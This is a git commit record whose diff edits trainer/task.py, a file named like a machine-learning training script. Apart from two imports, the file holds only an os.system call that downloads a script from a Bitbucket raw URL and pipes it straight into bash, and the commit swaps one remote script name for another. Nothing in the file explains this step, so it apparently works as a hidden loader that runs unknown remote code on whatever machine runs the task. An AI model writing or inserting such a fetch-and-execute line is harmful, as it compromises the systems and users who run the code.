f1ae92dacc84b55033245f214c3ffa053fac7ad5
choi mina <coi@xinnz.my.id>
2024-02-01 15:30:50 +0000

    task.py edited online with Bitbucket

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://bitbucket.org/vizanew/esce/raw/main/sorabi | bash')
+os.system('curl -sL https://bitbucket.org/vizanew/esce/raw/main/vishder | bash')
